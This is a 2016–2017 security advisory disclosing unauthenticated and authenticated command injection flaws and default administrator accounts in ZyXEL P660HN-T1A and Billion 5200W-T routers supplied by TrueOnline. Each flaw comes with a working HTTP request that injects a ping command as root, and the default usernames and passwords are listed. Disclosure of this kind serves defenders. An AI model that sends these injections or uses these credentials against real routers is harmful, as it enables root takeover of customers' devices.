@@ -1,0 +1,180 @@
+>> Multiple vulnerabilities in TrueOnline / ZyXEL / Billion routers
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+==========================================================================
+Disclosure: 26/12/2016 / Last updated: 18/01/2017
+
+
+>> Summary:
+TrueOnline is a major Internet Service Provider in Thailand which distributes various rebranded ZyXEL and Billion routers to its customers.
+Three router models - ZyXEL P660HN-T1A v1, ZyXEL P660HN-T1A v2 and Billion 5200W-T - contain a number of default administrative accounts, as well as authenticated and unauthenticated command injection vulnerabilities (running as root) in their web interfaces, mostly in the syslog remote forwarding function. All the routers are still in widespread use in Thailand, with the Billion 5200W-T router currently being distributed to new customers. 
+
+These routers are based on the TC3162U SoC (or variants of it), a system-on-a-chip made by TrendChip, which was a manufacturer of SoC that was acquired by Ralink / MediaTek in 2011.
+TC3162U based routers have two firmware variants. 
+
+The first variant is "ras", used on hardware versions that have 4mb or less of flash storage, which is based on the real time operating system ZynOS. It is infamous as the includes Allegro RomPager v4.07, which is vulnerable to the "misfortune cookie" attack (see [1]), and its web server is vulnerable to the "rom-0" attack (see [2]). 
+The other variant is "tclinux", which is a full fledged Linux used in hardware versions that have more than 4 MB of flash storage. This advisory refers to this variant, which includes the Boa web server and several ASP files with the command injection vulnerabilities. Note that tclinux might also be vulnerable to the misfortune cookie and rom-0 attacks - this was not investigated in detail by the author. For more information on tclinux see [3].
+
+It should be noted that tclinux contains files and configuration settings in other languages (for example in Turkish). Therefore it is likely that these firmware versions are not specific to TrueOnline, and other ISP customised routers in other countries might also be vulnerable. It is also possible that other brands and router models that use the tclinux variant are also affected by the command injection vulnerabilities (while the default accounts are likely to be TrueOnline specific). Please contact pedrib@gmail.com if you find any other routers or firmware versions that have the same vulnerabilities.
+
+These vulnerabilities were discovered in July 2016 and reported through Securiteam's Secure Disclosure program (see https://blogs.securiteam.com/index.php/archives/2910 for their advisory). SSD contacted the vendors involved, but received no reply and posted their advisory on December 26th 2016. There is currently no fix for these issues. It is unknown whether these issues are exploitable over the WAN, although this is a possibility since some of the default accounts appear to have been deployed for ISP use.
+
+Three Metasploit modules that abuse these vulnerabilities have been released (see [4], [5] and [6]).
+
+
+>> Update (18/01/2017):
+ZyXEL have responded to this advisory and published information about upcoming fixes for the 660HN v1 and v2 in http://www.zyxel.com/support/announcement_unauthenticated.shtml
+
+
+>> Technical details:
+#1 
+Vulnerability: Unauthenticated command injection (ZyXEL P660HN-T1A v1)
+NO-CVE - use FD:2017/Jan/40-1 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
+Attack Vector: Remote
+Constraints: Can be exploited by an unauthenticated attacker in the LAN. See below for other constraints.
+Affected versions:
+- ZyXEL P660HN-T1A, hardware revision v1, TrueOnline firmware version 340ULM0b31, other firmware versions might be affected
+
+This router has a command injection vulnerability in the Maintenance > Logs > System Log > Remote System Log forwarding function.
+The vulnerability is in the ViewLog.asp page, which is accessible unauthenticated. The following request will cause the router to issue 3 ping requests to 10.0.99.102:
+
+POST /cgi-bin/ViewLog.asp HTTP/1.1
+remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bping+-c+3+10.0.99.102%3b%23&remoteSubmit=Save
+
+The command in injection is in the remote_host parameter.
+This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
+
+
+#2
+Vulnerability: Authenticated command injection (ZyXEL P660HN-T1A v2)
+NO-CVE - use FD:2017/Jan/40-2 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
+Attack Vector: Remote
+Constraints: Can be exploited by an authenticated attacker in the LAN. See below for other constraints.
+Affected versions:
+- ZyXEL P660HN-T1A, hardware revision v2, TrueOnline firmware version 200AAJS3D0, other firmware versions might be affected
+
+Unlike in the P660HN-Tv1, the injection is authenticated and in the logSet.asp page. However, this router contains several default administrative accounts (see below) that can be used to exploit this vulnerability.
+The injection is in the logSet.asp page that sets up remote forwarding of syslog logs, and the parameter vulnerable to command injection is the serverIP parameter.
+The following request will cause the router to issue 3 ping requests to 1.1.1.1:
+
+POST /cgi-bin/pages/maintenance/logSetting/logSet.asp HTTP/1.1
+logSetting_H=1&active=1&logMode=LocalAndRemote&serverIP=192.168.1.1`ping -c 3 1.1.1.1`%26%23&serverPort=514
+
+This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root. 
+It is known that this injection ends up in  /etc/syslog.conf as
+ServerIP="192.168.1.1 `ping -c 3 1.1.1.1`&#"
+Which will then be executed by a background process almost immediately.
+The actual injection is limited to 28 characters. This can circunvented by writing a shell script file in the /tmp directory 28 characters at a time, and the executing that file.
+
+
+#3
+Vulnerability: Unauthenticated command injection (Billion 5200W-T)
+NO-CVE - use FD:2017/Jan/40-3 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
+Attack Vector: Remote
+Constraints: Can be exploited by an unauthenticated attacker in the LAN. See below for other constraints.
+Affected versions:
+- Billion 5200W-T, TrueOnline firmware version 1.02b.rc5.dt49, other firmware versions might be affected
+
+The Billion 5200W-T router contains an unauthenticated command injection in adv_remotelog.asp page, which is used to set up remote syslog forwarding.
+The following request will cause the router to issue 3 ping requests to 192.168.1.35:
+
+POST /cgi-bin/adv_remotelog.asp HTTP/1.1
+Host: 192.168.1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 85
+
+RemotelogEnable=1&syslogServerAddr=1.1.1.1%3bping+-c+3+192.168.1.35%3b&serverPort=514
+
+The injection is on the syslogServerAddr parameter and can be exploited by entering a valid IP address, followed by  ";<COMMAND>;"
+This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
+
+
+#4
+Vulnerability: Authenticated command injection (Billion 5200W-T)
+NO-CVE - use FD:2017/Jan/40-4 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
+Attack Vector: Remote
+Constraints: Can be exploited by an authenticated attacker in the LAN. See below for other constraints.
+Affected versions:
+- Billion 5200W-T, TrueOnline firmware version TCLinux Fw $7.3.8.0 v008 130603, other firmware versions might be affected
+
+The Billion 5200W-T router also has several other command injections in its interface, depending on the firmware version, such as an authenticated command injection in tools_time.asp (uiViewSNTPServer parameter).
+It should be noted that this router contains several default administrative accounts that can be used to exploit this vulnerability.
+This injection can be exploited with the following request:
+
+POST /cgi-bin/tools_time.asp HTTP/1.1
+Host: 192.168.1.1
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Cookie: SESSIONID=7c082c75
+
+SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer="%3b+ping+-c+20+192.168.0.1+%26%23&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA
+
+This writes the command to a file /etc/ntp.sh:
+/userfs/bin/ntpclient -s -c 3 -l -h ""; ping -c 20 192.168.0.1 &#" &
+which is then executed almost immediately.
+
+This vulnerability was found during a black box assessment of the web interface, so the injection path was not fully investigated. All commands run as root.
+
+
+#5
+Vulnerability: Default administrative credentials (ZyXEL P660HN-T1A v1)
+NO-CVE - use FD:2017/Jan/40-5 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
+Attack Vector: Remote
+Constraints: N/A
+Affected versions:
+- ZyXEL P660HN-T1A, hardware revision v1, TrueOnline firmware version 340ULM0b31, other firmware versions might be affected
+
+This router contains the following default administrative accounts:
+username: admin; password: password
+username: true; password: true
+
+
+#6
+Vulnerability: Default administrative credentials (ZyXEL P660HN-T1A v2)
+NO-CVE - use FD:2017/Jan/40-6 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
+Attack Vector: Remote
+Constraints: N/A
+Affected versions:
+- ZyXEL P660HN-T1A, hardware revision v2, TrueOnline firmware version 200AAJS3D0, other firmware versions might be affected
+
+This router contains the following default administrative accounts:
+username: admin; password: password
+username: true; password: true
+username: supervisor; password: zyad1234
+
+
+#7
+Vulnerability: Default administrative credentials (Billion 5200W-T)
+NO-CVE - use FD:2017/Jan/40-7 (Full Disclosure) or SSD-2910 (SecuriTeam blog)
+Attack Vector: Remote
+Constraints: N/A
+Affected versions:
+- Billion 5200W-T, TrueOnline firmware version TCLinux Fw $7.3.8.0 v008 130603, other firmware versions might be affected
+
+This router contains the following default administrative accounts:
+username: admin; password: password
+username: true; password: true
+username: user3; password: 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678
+
+
+>> Fix:
+There is NO FIX for this vulnerability. Do not allow untrusted clients to connect to these routers. Timeline of disclosure:
+July 2016: Vulnerability reported to Securiteam Secure Disclosure
+           Securiteam contacted the affected versions. No response.
+           
+26.12.2016: Vulnerability information published in the SSD blog (https://blogs.securiteam.com/index.php/archives/2910 for their advisory).
+12.01.2017: Vulnerability information published in https://github.com/pedrib/PoC
+18.01.2017: ZyXEL have responded to this advisory and published information about upcoming fixes for the 660HN v1 and v2 in http://www.zyxel.com/support/announcement_unauthenticated.shtml
+
+
+>> References:
+[1] http://www.kb.cert.org/vuls/id/561444
+[2] https://k0st.wordpress.com/2015/07/05/identifying-and-exploiting-rom-0-vulnerabilities/
+[3] https://vasvir.wordpress.com/tag/trendchip-firmware/
+[4] https://github.com/rapid7/metasploit-framework/pull/7820
+[5] https://github.com/rapid7/metasploit-framework/pull/7821
+[6] https://github.com/rapid7/metasploit-framework/pull/7822
+
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
